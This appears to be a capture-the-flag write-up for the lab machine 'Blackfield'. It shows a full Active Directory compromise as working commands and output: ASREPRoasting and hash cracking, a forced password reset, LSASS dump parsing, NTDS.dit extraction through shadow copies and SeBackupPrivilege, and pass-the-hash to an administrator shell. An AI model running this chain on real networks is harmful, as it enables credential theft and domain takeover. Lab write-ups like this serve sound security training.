

![logo blackfield](Images/logo%20blackfield.png)

# Attack Chain

```
Null / Guest SMB auth
└─► READ on profiles$ share
    └─► Enumerate user directories → userlist
        └─► ASREPRoasting (GetNPUsers) → support AS-REP hash
            └─► hashcat -m 18200 → support:#00^BlackKnight
                └─► BloodHound: support ─[ForceChangePassword]─► audit2020
                    └─► bloodyAD set password → reset audit2020
                        └─► READ on forensic share
                            └─► lsass.zip → pypykatz → svc_backup NT hash
                                └─► WinRM (PSRemote) as svc_backup → user.txt
                                    └─► SeBackupPrivilege + Backup Operators
                                        └─► diskshadow (VSS) + robocopy → NTDS.dit
                                            └─► reg save HKLM\SYSTEM → SYSTEM hive
                                                └─► NTDS dump → administrator hash
                                                    └─► WinRM PtH → root.txt
```

# Summary

- [Enumeration](#enumeration)
	- [nmap](#nmap)
	- [SMB](#smb)
- [Userlist creation](#userlist-creation)
- [ASREPRoasting](#asreproasting)
	- [Request TGT](#request-tgt)
	- [Crack the hash](#crack-the-hash)
- [BloodHound](#bloodhound)
- [Forensic Share](#forensic-share)
- [Dump LSASS](#dump-lsass)
- [Privilege Escalation](#privilege-escalation)
	- [Prerequisite](#prerequisite)
	- [Copy NTDS.dit and SYSTEM hive](#copy-ntdsdit-and-system-hive)
	- [Extract NTDS.dit](#extract-ntdsdit)
	- [Shell as administrator](#shell-as-administrator)

---
# Enumeration

### nmap

Let's start by scanning the target with `nmap`.

```
nmap -sVC 10.129.*.* -oA nmap

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-16 15:03:49Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

> [!NOTE]
> **Observations**
> - Target is an Active Directory
> - Domain is `BLACKFIELD.local`
> - FQDN is `DC01.BLACKFIELD.local`

Let's add these entries into our `/etc/hosts` file.

```
echo '10.129.*.* DC01 DC01.BLACKFIELD.local BLACKFIELD.local' | tee -a /etc/hosts
```

### SMB

We don't have given credentials for this challenge, but we can still try to look at SMB and see if Null Auth is enabled.

```
nxc smb 10.129.*.* -u '' -p ''                                       SMB         10.129.*.*   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.*.*   445    DC01             [+] BLACKFIELD.local\:
```

It is, but we can't list the shares.

```
nxc smb 10.129.*.* -u '' -p '' --shares
SMB         10.129.*.*   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.*.*   445    DC01             [+] BLACKFIELD.local\:
SMB         10.129.*.*   445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

Let's try with the built-in `guest` account.

```
nxc smb 10.129.*.* -u 'guest' -p ''
SMB         10.129.*.*   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.*.*   445    DC01             [+] BLACKFIELD.local\guest:
```

The account is not disabled, let's try to list the shares with this one.

```
nxc smb 10.129.*.* -u 'guest' -p '' --shares

SMB     10.129.*.*   445    DC01             [+] BLACKFIELD.local\guest:
SMB     10.129.*.*   445    DC01             [*] Enumerated shares
SMB     10.129.*.*   445    DC01      Share           Permissions     Remark
SMB     10.129.*.*   445    DC01      -----           -----------     ------
SMB     10.129.*.*   445    DC01      ADMIN$                          Remote Admin
SMB     10.129.*.*   445    DC01      C$                              Default share
SMB     10.129.*.*   445    DC01      forensic                        Forensic / Audit share.
SMB     10.129.*.*   445    DC01      IPC$            READ            Remote IPC
SMB     10.129.*.*   445    DC01      NETLOGON                        Logon server share
SMB     10.129.*.*   445    DC01      profiles$       READ
SMB     10.129.*.*   445    DC01      SYSVOL                          Logon server share
```

We can list the shares, and we have **READ** access to `profiles$`.

# Userlist creation

Let's enumerate the discovered share.

```
smbclientng -d "BLACKFIELD.local" -u "guest" -p "" --host "10.129.*.*"
               _          _ _            _
 ___ _ __ ___ | |__   ___| (_) ___ _ __ | |_      _ __   __ _
/ __| '_ ` _ \| '_ \ / __| | |/ _ \ '_ \| __|____| '_ \ / _` |
\__ \ | | | | | |_) | (__| | |  __/ | | | ||_____| | | | (_| |
|___/_| |_| |_|_.__/ \___|_|_|\___|_| |_|\__|    |_| |_|\__, |
    by @podalirius_                             v3.0.0  |___/

  | Provide a password for 'BLACKFIELD.local\guest': <blank>
[+] Successfully authenticated to '10.129.*.*' as 'BLACKFIELD.local\guest'!
■[\\10.129.*.*\]> use profiles$
■[\\10.129.*.*\profiles$\]> ls
d-------     0.00 B  2020-06-03 18:47  .\
d-------     0.00 B  2020-06-03 18:47  ..\
d-------     0.00 B  2020-06-03 18:47  AAlleni\
d-------     0.00 B  2020-06-03 18:47  ABarteski\
d-------     0.00 B  2020-06-03 18:47  ABekesz\
d-------     0.00 B  2020-06-03 18:47  ABenzies\
<SNIP>
```

Listing the share reveals a list of directories that could match domain users. Nothing is available in their directory though.

But we can create a list of every user mentioned in the share and see if we can perform attack such as **Kerberoasting** or **ASREPRoasting**.

We copy the `ls` output to a file and we can run the following command so it's a clean list.

```
cat users.txt | tr -d '\\' | awk '/^d/{print $NF}' > userslist.txt
```

# ASREPRoasting

Now that we have a list of users, let's try **ASREPRoasting**.
### Request TGT

We can use `GetNPUsers.py` from Impacket to perform the attack. 

It will send an AS-REQ for every user on the list, and for those with **DONT_REQ_PREAUTH** set, the KDC returns an AS-REP whose encrypted part is crackable offline.

We will then retrieve a hash derived from the user's password.

```
GetNPUsers.py -dc-ip "10.129.*.*" "BLACKFIELD.local"/ -usersfile userslist.txt -request -outputfile asreproasting.txt

<SNIP>

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set

<SNIP>

$krb5asrep$23$support@BLACKFIELD.LOCAL:7bfbd07741c6e709e9b5937dea24008f$d6158bcc2c8d17e7534de24f397b455d13edf0288dc3387ad103ca399a6a4c768e400f6c2e7775c4b38a4aeea120eca0320ee4a5e73135cce6b5ae675017d4a10afa15a0756afbc80b83efea9a58ab2a1bb619b4bf53f3bd9c7fec2d9aea77aee09baebcb0e3db46b6b22634af333015115f71d77d32ea499f254df558306ed5ebdbdb5748ee77c018a4d1c8a40a1f01bafaf7e1709f7b6f448c2683a839425bb65a140cc6af801a351c82af5fd23e8257bc034338ebc9e74a853acef0fca0fd508b43163cea299d98eb25f124e2b3817bc2d66c9c89f22f1686def9a2558bc7b0abbac56a75d2fa9c56fb16351152237e8c0f48

<SNIP>

[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set

<SNIP>
```

Our attempt is successful, we have a hash for the user `support`.

We also know that `audit2020` and `svc_backup` are present on the target.
### Crack the hash

We can use `hashcat` to crack the hash.

```
hashcat -m 18200 asreproasting.txt `fzf-wordlists`

<SNIP>

$krb5asrep$23$support@BLACKFIELD.LOCAL:7bfbd07741c6e709e9b5937dea24008f$d6158bcc2c8d17e7534de24f397b455d13edf0288dc3387ad103ca399a6a4c768e400f6c2e7775c4b38a4aeea120eca0320ee4a5e73135cce6b5ae675017d4a10afa15a0756afbc80b83efea9a58ab2a1bb619b4bf53f3bd9c7fec2d9aea77aee09baebcb0e3db46b6b22634af333015115f71d77d32ea499f254df558306ed5ebdbdb5748ee77c018a4d1c8a40a1f01bafaf7e1709f7b6f448c2683a839425bb65a140cc6af801a351c82af5fd23e8257bc034338ebc9e74a853acef0fca0fd508b43163cea299d98eb25f124e2b3817bc2d66c9c89f22f1686def9a2558bc7b0abbac56a75d2fa9c56fb16351152237e8c0f48:#00^BlackKnight

<SNIP>
```

> [!TIP]
> **Credentials obtained**
> `support` : `#00^BlackKnight`

Let's check if the account is valid with `NetExec`.

```
nxc smb 10.129.*.* -u 'support' -p '#00^BlackKnight'
SMB         10.129.*.*   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.*.*   445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight
```

# BloodHound

Now that we have compromised an account, we can collect domain data using **BloodHound** collector.

```
bloodhound.py -c all --zip -d 'BLACKFIELD.local' -u 'support' -p '#00^BlackKnight' -ns '10.129.*.*'
```

After importing the file in **BloodHound**, we notice that the user `support` has **ForceChangePassword** on the user `audit2020`, which means the user can change their password.

![ForceChangePassword Blackfied](Images/ForceChangePassword%20Blackfied.png)

To change its password, we can use `bloodyAD`.

```
bloodyAD -H '10.129.*.*' -d 'BLACKFIELD.local' -u 'support' -p '#00^BlackKnight' set password audit2020 'P@ssword123'
[+] Password changed successfully!
```

The password has been successfully changed.

# Forensic Share

We have a new account, let's list the shares and look for new ones we didn't have access to before.

```
nxc smb 10.129.*.* -u 'audit2020' -p 'P@ssword123' --shares

<SNIP>

SMB     10.129.*.*  445    DC01       forensic    READ   Forensic / Audit share.

<SNIP>
```

We now have **READ** access to `forensic`.

We can find several interesting files such as **command output** with the list of the groups and users present on the target, the running tasks, etc...

```
■[\\10.129.*.*\forensic\commands_output\]> ls
d-------     0.00 B  2020-02-23 19:14  .\
d-------     0.00 B  2020-02-23 19:14  ..\
-a------   528.00 B  2020-02-23 14:00  domain_admins.txt
-a------   962.00 B  2020-02-23 13:51  domain_groups.txt
-a------   16.07 kB  2020-02-28 23:32  domain_users.txt
-a------  506.06 kB  2020-02-23 13:53  firewall_rules.txt
-a------    1.74 kB  2020-02-23 13:50  ipconfig.txt
-a------    3.75 kB  2020-02-23 13:51  netstat.txt
-a------    3.88 kB  2020-02-23 13:53  route.txt
-a------    4.44 kB  2020-02-23 13:56  systeminfo.txt
-a------    9.76 kB  2020-02-23 13:54  tasklist.txt
```

We can also find under `memory_analysis` a **LSASS**.
This file should be retrieved and exploited with a tool such as `pypykatz` so we could retrieve some valuable information.

```
■[\\10.129.*.*\forensic\]> cd memory_analysis/
■[\\10.129.*.*\forensic\memory_analysis\]> get lsass.zip
```

# Dump LSASS

Extracting the dumped file shows the following.

```
unzip lsass.zip
pypykatz lsa minidump lsass.DMP

<SNIP>
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
<SNIP>
```

We have the NT hash of the user `svc_backup`.

Let's check if that hash still works.

```
nxc smb 10.129.*.* -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
SMB         10.129.*.*   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.*.*   445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d
```

It's valid!
From **BloodHound** we see that we have **PSRemote** on the DC so let's connect over **WinRM**.

```
evil-winrm -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d' -i 10.129.*.*

*Evil-WinRM* PS C:\Users\svc_backup\Documents>
```

We can get the user flag from here.

# Privilege Escalation

Looking at our privileges with the user `svc_backup` reveals the following :

```
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

We have `SeBackupPrivilege` and `SeRestorePrivilege`, along with a membership inside the `Backup Operators` group. 

With these privileges, we can retrieve the file `NTDS.dit` and dump every NT hash of the domain users.

### Prerequisite

However, we can't just copy the wanted file since it's currently in use/locked by the target. So we must make a copy of the `C:` drive and then retrieve `NTDS.dit` after.

Since our shell over **WinRM** is not interactive, we can't use `diskshadow` as we want.

To perform this attack, we must write a simple txt file that will contain every command we want `diskshadow`to execute.

**script.txt**
```
set context persistent nowriters
add volume c: alias cdrive
create
expose %cdrive% z:
```

> [!WARNING]
> We have to leave a blank space at the end of every line so the file is parsed correctly

### Copy NTDS.dit and SYSTEM hive

Once we have our file, we upload it to the target and make a shadow copy of the `C:` drive.

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> diskshadow /s script.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  7/16/2026 2:27:20 PM

-> set context persistent nowriters
-> add volume c: alias cdrive
-> create
Alias cdrive for shadow ID {da4f5605-221a-4e07-807b-ad54dfee62ff} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {b077487e-417e-4d13-828d-b16e5d572f0d} set as environment variable.

Querying all shadow copies with the shadow copy set ID {b077487e-417e-4d13-828d-b16e5d572f0d}

        * Shadow copy ID = {da4f5605-221a-4e07-807b-ad54dfee62ff}               %cdrive%
                - Shadow copy set: {b077487e-417e-4d13-828d-b16e5d572f0d}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 7/16/2026 2:27:21 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %cdrive% z:
-> %cdrive% = {da4f5605-221a-4e07-807b-ad54dfee62ff}
The shadow copy was successfully exposed as z:\.
```

We create a copy of `C:` that is exposed on `Z:`.

Now we can copy the file to our current directory.

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> robocopy /b Z:\Windows\ntds . ntds.dit
```

And then, we need to also retrieve the `SYSTEM` hive.

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save HKLM\SYSTEM system.save
```

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> ls


    Directory: C:\Users\svc_backup\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/16/2026   9:48 AM       18874368 ntds.dit
-a----        7/16/2026   9:48 AM            191 script.txt
-a----        7/16/2026   9:52 AM       17580032 system.save
```

We can now transfer these files to our machine.

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> download system.save
*Evil-WinRM* PS C:\Users\svc_backup\Documents> download ntds.dit
```

### Extract NTDS.dit

We have everything we need to dump the secrets of the domain using `secretsdump` from **Impacket**.

```
secretsdump -ntds ntds.dit -system system.save LOCAL                               Impacket (Exegol fork) v0.14.0.dev0+20260120.113623.b52b6449 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee
:::
<SNIP>
```

### Shell as administrator

We finally retrieved the NT hash of `administrator`, let's connect on the target over **WinRM**.

```
evil-winrm -u 'administrator' -H '184fb5e5178480be64824d4cd53b99ee' -i 10.129.*.*

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```


> [!TIP]
> **Machine Rooted**